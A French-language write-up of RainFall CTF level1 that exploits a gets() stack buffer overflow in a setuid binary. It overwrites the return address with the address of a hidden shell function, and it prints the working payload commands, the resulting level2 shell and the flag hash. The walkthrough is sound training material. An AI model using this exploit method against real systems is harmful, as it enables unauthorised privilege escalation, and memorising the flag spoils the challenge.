# RainFall CTF - Level1

## Reconnaissance

### Fichier trouvé
```bash
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

**Observations :**
- Exécutable avec SUID bit activé (`s` dans les permissions)
- Appartient à `level2` (propriétaire) et `users` (groupe)
- Peut être exécuté avec les privilèges de `level2`

## Analyse statique

### Extraction et reverse engineering
- Analyse avec **Ghidra**

### Fonction main décompilée

```c
void main(void)
{
  char local_50 [76];
  
  gets(local_50);
  return;
}
```

### Fonction cachée découverte

```c
void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}
```

## Analyse des vulnérabilités

### Buffer Overflow
- **Variable vulnérable** : `local_50[76]` (tableau de 76 caractères)
- **Fonction dangereuse** : `gets()` - aucune vérification de taille
- **Impact** : Débordement possible du buffer sur la pile

### Fonction non utilisée
- **Fonction** : `run()` 
- **Adresse** : `0x08048444`
- **Comportement** : Ouvre un shell avec les privilèges de `level2`

## Exploitation

### Stratégie d'attaque
1. **Buffer Overflow** : Remplir le buffer `local_50[76]` avec 76 caractères
2. **ROP/Ret2func** : Écraser l'adresse de retour avec l'adresse de `run()`
3. **Little Endian** : Convertir l'adresse `0x08048444` → `\x44\x84\x04\x08`

### Première tentative (échec)
```bash
level1@RainFall:~$ python -c "print('A' * 76 + '\x44\x84\x04\x08')" | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

**Problème** : Le shell se ferme immédiatement car stdin n'est pas maintenu ouvert.

### Exploitation réussie
```bash
level1@RainFall:~$ (python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1
Good... Wait what?
whoami
level2
```

**Explication** : 
- `cat` maintient stdin ouvert pour permettre l'interaction avec le shell
- Le payload déborde le buffer et écrase l'adresse de retour avec celle de `run()`

### Récupération du flag
```bash
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Détails techniques

### Structure du payload
```
[PADDING: 76 x 'A'] + [ADRESSE: \x44\x84\x04\x08]
```

### Analyse de la pile
- **Buffer** : 76 octets
- **Adresse de retour** : 4 octets (architecture 32-bit)
- **Total offset** : 76 octets avant d'écraser EIP

### Encodage little-endian
```
Adresse originale : 0x08048444
Little-endian     : \x44\x84\x04\x08
```

## Résultats

### Flag obtenu
```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

### Accès niveau suivant
- **Utilisateur** : `level2`
- **Prochain challenge** : `/home/user/level2/`

## Notes techniques

- **Type de vulnérabilité** : Buffer Overflow + Return-to-function
- **Technique d'exploitation** : Stack-based buffer overflow avec redirection vers fonction cachée
- **Architecture** : x86 (32-bit)
- **Fonction dangereuse** : `gets()` - deprecated et non sécurisée
- **Impact** : Escalade de privilèges locale
- **Difficulté** : Intermédiaire

### Leçons apprises
- Toujours utiliser `cat` ou équivalent pour maintenir stdin lors d'exploitations de shells
- Les fonctions non référencées peuvent être des backdoors intentionnelles dans les CTF
- `gets()` est une fonction à bannir absolument en production